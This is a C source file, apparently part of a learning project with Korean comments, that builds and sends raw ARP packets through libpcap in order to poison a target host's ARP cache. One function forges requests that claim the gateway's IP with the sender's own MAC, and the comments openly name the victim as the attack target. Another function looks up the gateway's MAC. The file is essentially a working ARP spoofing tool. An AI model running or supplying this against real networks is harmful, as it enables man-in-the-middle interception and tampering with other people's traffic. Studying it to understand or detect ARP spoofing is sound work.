#include "arpheader.h"

void broadcast(char *argv[], pcap_t *handle)
{
      /*
      ARP
      ip 주소로 mac 주소 받아오기
      Ethernet--------------------
      dst_mac : FF:FF
      src_mac : AA:AA (my mac)
      ARP-------------------------
      src_mac : AA:AA (my mac)
      src_ip : 게이트웨이 IP
      dst_mac : FF:FF
      dst_ip : 공격 대상 IP
      ----------------------------

      '나의 mac주소는 AA:AA 이고 IP는 게이트웨이 IP인데 "공격 대상 IP"의 mac주소는 뭐야?'
      이후 relpy 응답이 오면 공격 대상의 ARP 테이블에는 게이트웨이가 공격자의 mac주소로 변경되어 있다.
      */
      u_char pkt[PACKETSIZE];
      struct allpacket *s_packet = (struct allpacket *)pkt;

      // Ethernet 주소 설정
      for (int i = 0; i <= 5; i++)
      {
            s_packet->eth_dmac[i] = 0xFF;
      }
      for (int i = 0; i <= 5; i++)
      {
            s_packet->eth_smac[i] = mymac[i]; // 나의 mac 입력
      }

      s_packet->type = ntohs(0x0806);          // ARP 0x0806
      s_packet->hd_type = ntohs(0x0001);       // HardWare type : ethernet 1
      s_packet->protocol_type = ntohs(0x0800); // Protocol type : IPv4 0x0800
      s_packet->hd_size = 0x06;                // Hardware size 6 , Protocol size 4
      s_packet->protocol_size = 0x04;          //
      s_packet->opcode = ntohs(0x0001);        // OPcode 1 = request ,2 = reply

      // 나의 mac 입력 (sender 의 mac 주소)
      for (int i = 0; i <= 5; i++)
      {
            s_packet->arp_sender_mac[i] = mymac[i];
      }
      // 게이트웨이 주소 ( = 공격 대상의 IP = 게이트웨이 또한 공격 대상
      s_packet->arp_sender_ip = inet_addr(argv[3]); // argv[3] = Gateway mac Address
      // inet_aton(argv[3],&s_packet->arp_sender_ip);

      // 속일 mac 주소(Sender의 mac 주소)(공격 당하는 사람)
      for (int i = 0; i <= 5; i++)
      {
            s_packet->arp_target_mac[i] = 0x00;
      }

      // inet_aton(argv[2],&s_packet->arp_target_ip);  // 속일 ip 주소
      s_packet->arp_target_ip = inet_addr(argv[2]);

      int res = pcap_sendpacket(handle, pkt, sizeof(pkt));

      if (res == -1)
            printf(" error\n");
      else
            printf("BroadCast success \n");
}

void gateway_mac(char *argv[], pcap_t *handle)
{
      /*
      Ethernet--------------------
      dst_mac : FF:FF
      src_mac : AA:AA (my mac)
      ARP-------------------------
      src_mac : AA:AA (my mac)
      src_ip : 나의 IP
      dst_mac : FF:FF
      dst_ip : GateWay IP
      ----------------------------
      */

      u_char pkt[PACKETSIZE];
      struct allpacket *s_packet = (struct allpacket *)pkt;

      // Ethernet 주소 설정
      for (int i = 0; i <= 5; i++)
      {
            s_packet->eth_dmac[i] = 0xFF;
      }
      for (int i = 0; i <= 5; i++)
      {
            s_packet->eth_smac[i] = mymac[i]; // 나의 mac 입력
      }

      s_packet->type = ntohs(0x0806);          // ARP 0x0806
      s_packet->hd_type = ntohs(0x0001);       // HardWare type : ethernet 1
      s_packet->protocol_type = ntohs(0x0800); // Protocol type : IPv4 0x0800
      s_packet->hd_size = 0x06;                // Hardware size 6 , Protocol size 4
      s_packet->protocol_size = 0x04;          // OPcode 1 = request ,2 = reply
      s_packet->opcode = ntohs(0x0001);

      // 나의 mac 입력 (sender 의 mac 주소)
      for (int i = 0; i <= 5; i++)
      {
            s_packet->arp_sender_mac[i] = s_packet->eth_smac[i];
      }

      // inet_aton(argv[3],&s_packet->arp_sender_ip);
      s_packet->arp_sender_ip = inet_addr(myip);

      // 속일 mac 주소(Sender의 mac 주소)(공격 당하는 사람)
      for (int i = 0; i <= 5; i++)
      {
            s_packet->arp_target_mac[i] = 0x00;
      }

      // inet_aton(argv[3], &s_packet->arp_target_ip);
      s_packet->arp_target_ip = inet_addr(argv[3]); // 속일 ip 주소
      // s_packet->arp_target_ip = addr_save->save_tip;

      int res = pcap_sendpacket(handle, pkt, sizeof(pkt));

      if (res == -1)
            printf(" error\n");
      else
            printf("GateWay BroadCast success \n");
}

int check_mac(u_int8_t *mac1, u_int8_t *mac2)
{
      for (int i = 0; i < 6; i++)
            if (mac1[i] != mac2[i])
                  return 0;

      return 1;
}